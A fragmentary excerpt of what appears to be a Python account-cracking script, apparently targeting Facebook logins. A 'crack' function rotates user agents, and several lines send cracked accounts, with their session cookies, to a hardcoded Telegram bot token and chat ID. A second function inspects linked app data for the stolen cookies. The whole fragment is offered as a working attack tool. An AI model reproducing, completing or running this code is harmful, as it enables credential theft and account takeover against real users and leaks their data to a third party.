...
g= datetime.datetime(2028, 12, 26, 0, 0 )
...
print('')
rmad = '6466083926:AAHuUyboDEXlOBPNHO-Cud7hV5fmdpJVEUI'
rm98 = '647776789'
...
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([a3,a4,a5,a6,a7,a10,a12,a14,u,k,kk,b,h,hh,a19,a20,a21,a22,a23,a25,a26,a27,a36,a37,a40,xxh,])
...
⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ 
 {kuki}	'''
					...
					requests.get(f"https://api.telegram.org/bot"+str(rmad)+"/sendMessage?chat_id="+str(rm98)+"&text="+str(statuscp+touy8))
				break
...
'''
 ...
 '''
					...
					requests.get(f"https://api.telegram.org/bot"+str(rmad)+"/sendMessage?chat_id="+str(rm98)+"&text="+str(statusok+touy8))
					break
...
𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°•❈•°•❅••❅•°•❈•°•❅•  647776789
 ...
 '''					
					...
					requests.get(f"https://api.telegram.org/bot"+str(rmad)+"/sendMessage?chat_id="+str(rm98)+"&text="+str(infoakun+touy8))
...
def cek_RMAD(kuki):
	...
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              જ⁀➴ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	...
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              જ⁀➴ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
